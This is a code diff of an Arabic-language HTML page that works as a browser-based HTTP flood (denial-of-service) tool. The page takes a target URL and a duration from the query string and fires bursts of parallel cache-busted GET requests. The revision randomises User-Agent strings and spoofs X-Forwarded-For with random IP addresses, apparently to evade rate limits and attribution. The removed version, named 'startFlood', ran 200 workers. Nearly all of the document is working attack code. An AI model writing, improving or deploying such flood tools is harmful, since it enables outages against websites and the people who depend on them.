@@ -1,25 +1,10 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>أداة إرسال طلبات فائقة السرعة</title>
+    <title>أداة إرسال طلبات</title>
     <script>
-        const config = {
-            parallelRequests: 200,    // زيادة عدد العمال إلى 200
-            requestTimeout: 1000,    // تقليل وقت الانتظار إلى ثانية واحدة
-            cacheBusting: true       // تجنب التخزين المؤقت
-        };
-
-        let stats = {
-            total: 0,
-            rps: 0,
-            startTime: 0
-        };
-        let isRunning = false;
-        let intervalId;
-
         function getQueryParams() {
             const params = new URLSearchParams(window.location.search);
             return {
@@ -28,65 +13,90 @@
             };
         }
 
-        function getRandomHeaders() {
-            return {
-                'Cache-Control': 'no-cache'
-            };
+        let totalRequests = 0;
+        let requestsPerSecond = 0;
+        let intervalId;
+        let isRunning = false;
+
+        function getRandomIP() {
+            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
         }
 
-        function fireRequest(url) {
+        async function sendRequest(targetUrl) {
             if (!isRunning) return;
 
             const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), config.requestTimeout);
+            const timeout = setTimeout(() => controller.abort(), 1000); // وقت انتهاء 1 ثانية
 
-            const fullUrl = url + (config.cacheBusting ? `&_=${Math.random().toString(36).slice(2)}` : '');
-            fetch(fullUrl, {
-                method: 'GET',
-                headers: getRandomHeaders(),
-                mode: 'no-cors',
-                cache: 'no-store',
-                signal: controller.signal
-            })
-            .then(() => {
-                stats.total++;
-                stats.rps++;
-            })
-            .catch(() => {}) // تجاهل الأخطاء للسرعة
-            .finally(() => clearTimeout(timeout));
+            try {
+                const headers = {
+                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 80}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
+                    'X-Forwarded-For': getRandomIP(),
+                    'Accept': '*/*',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                };
+
+                const response = await fetch(targetUrl + `?cachebust=${Math.random().toString(36).slice(2)}`, {
+                    method: 'GET',
+                    headers: headers,
+                    mode: 'cors', // تغيير إلى cors لضمان وصول الطلبات
+                    cache: 'no-store',
+                    referrerPolicy: 'no-referrer',
+                    signal: controller.signal
+                });
+
+                if (response.ok || response.type === 'basic') {
+                    totalRequests++;
+                    requestsPerSecond++;
+                }
+            } catch (e) {
+                // تجاهل الأخطاء غير الحرجة فقط
+                if (e.name !== 'AbortError') {
+                    console.log('خطأ:', e.message); // اختياري للتصحيح
+                }
+            } finally {
+                clearTimeout(timeout);
+            }
         }
 
-        function startFlood(targetUrl, duration) {
+        function startSending(targetUrl, durationSeconds) {
             if (!targetUrl) {
-                document.body.textContent = 'خطأ: يرجى إضافة ?url=الرابط_الهدف';
+                document.body.textContent = 'خطأ: يرجى تحديد رابط الهدف عبر بارامتر url';
                 return;
             }
 
-            stats = { total: 0, rps: 0, startTime: Date.now() };
             isRunning = true;
+            const startTime = Date.now();
+            const endTime = startTime + (durationSeconds * 1000);
 
             intervalId = setInterval(() => {
-                document.body.textContent = `rps ${stats.rps} total ${stats.total}`;
-                stats.rps = 0;
+                document.body.textContent = `rps ${requestsPerSecond} total ${totalRequests}`;
+                requestsPerSecond = 0;
             }, 1000);
 
-            // إطلاق الطلبات بشكل مستمر
-            const workers = Array(config.parallelRequests).fill().map(() => {
-                return async () => {
-                    while (isRunning && Date.now() < stats.startTime + (duration * 1000)) {
-                        fireRequest(targetUrl); // بدون await للسرعة القصوى
-                    }
-                };
-            });
+            function sendLoop() {
+                if (!isRunning || Date.now() >= endTime) {
+                    stopSending();
+                    return;
+                }
 
-            workers.forEach(worker => worker());
-            setTimeout(stopFlood, duration * 1000);
+                const parallelRequests = 50; // زيادة العدد للسرعة
+                const promises = [];
+                for (let i = 0; i < parallelRequests; i++) {
+                    promises.push(sendRequest(targetUrl));
+                }
+
+                Promise.allSettled(promises).then(() => setTimeout(sendLoop, 0));
+            }
+
+            sendLoop();
         }
 
-        function stopFlood() {
+        function stopSending() {
             isRunning = false;
             clearInterval(intervalId);
-            document.body.textContent = `تم الإنتهاء | rps ${stats.rps} total ${stats.total}`;
+            document.body.textContent = `تم الانتهاء | rps ${requestsPerSecond} total ${totalRequests}`;
         }
 
         window.onload = function() {
@@ -99,8 +109,8 @@
             document.body.style.backgroundColor = 'white';
             document.body.style.color = 'black';
 
-            const { url, time } = getQueryParams();
-            startFlood(url, time);
+            const params = getQueryParams();
+            startSending(params.url, params.time);
         };
     </script>
 </head>
